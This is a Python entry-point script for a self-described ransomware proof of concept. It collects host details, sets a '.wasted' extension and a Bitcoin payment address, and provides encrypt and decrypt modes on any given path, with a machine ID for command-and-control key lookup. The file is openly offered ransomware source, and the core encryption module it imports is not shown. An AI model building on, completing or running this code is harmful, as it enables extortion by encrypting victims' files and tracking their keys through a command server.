import argparse
import os
import sys
import platform
import getpass
import logging
from datetime import datetime
from dotenv import load_dotenv

from ransomware.config import AppConfig
from ransomware.core import RansomwareApp
from ransomware.logging import init_logging

# Load environment variables from .env
load_dotenv()

extension = os.environ.get('extension', '.wasted')
PAYMENT_ADDRESS = os.environ.get('PAYMENT_ADDRESS', '1BitcoinEaterAddressDontSendf59kuE')

# -----------------
# LOGGING SETUP
# -----------------
def setup_logging():
    """Setup logging configuration to track all activities"""
    # Create logs directory if it doesn't exist
    if not os.path.exists('logs'):
        os.makedirs('logs')
    
    # Create log filename with timestamp
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    log_filename = f'logs/ransomware_activity_{timestamp}.log'
    
    # Configure logging
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=[
            logging.FileHandler(log_filename, encoding='utf-8'),
            logging.StreamHandler(sys.stdout)
        ]
    )
    
    logger = logging.getLogger(__name__)
    logger.info("=" * 60)
    logger.info("RANSOMWARE PoC ACTIVITY LOG STARTED")
    logger.info("=" * 60)
    logger.info(f"Log file: {log_filename}")
    logger.info(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    logger.info(f"Platform: {platform.system()} {platform.release()}")
    logger.info(f"Python version: {sys.version}")
    logger.info(f"User: {getpass.getuser()}")
    logger.info(f"Hostname: {platform.node()}")
    logger.info("=" * 60)
    
    return logger

# Initialize logger
logger = setup_logging()

# -----------------
# GLOBAL VARIABLES
# CHANGE IF NEEDED
# -----------------
def parse_args():
    """
    Parse command-line arguments for encryption/decryption and target path.
    """
    parser = argparse.ArgumentParser(description='Ransomware PoC')
    parser.add_argument('-p', '--path', help='Absolute path to start encryption. If none specified, defaults to ./testDir/banking_receipts', default='./testDir/banking_receipts')
    parser.add_argument('--mid', dest='machine_id', help='Machine ID for C2 key lookup during decryption', default=None)
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-e', '--encrypt', help='Enable encryption of files', action='store_true')
    group.add_argument('-d', '--decrypt', help='Enable decryption of encrypted files', action='store_true')
    return parser.parse_args()

def main():
    """
    Main function to initialize config and run the ransomware app.
    """
    args = parse_args()
    config = AppConfig()
    init_logging(config.log_level)
    app = RansomwareApp(config)
    app.run_process(args.path, encrypt=args.encrypt, extension=extension, machine_id=args.machine_id)

if __name__ == "__main__":
    # Entry point for running the ransomware PoC
    main()
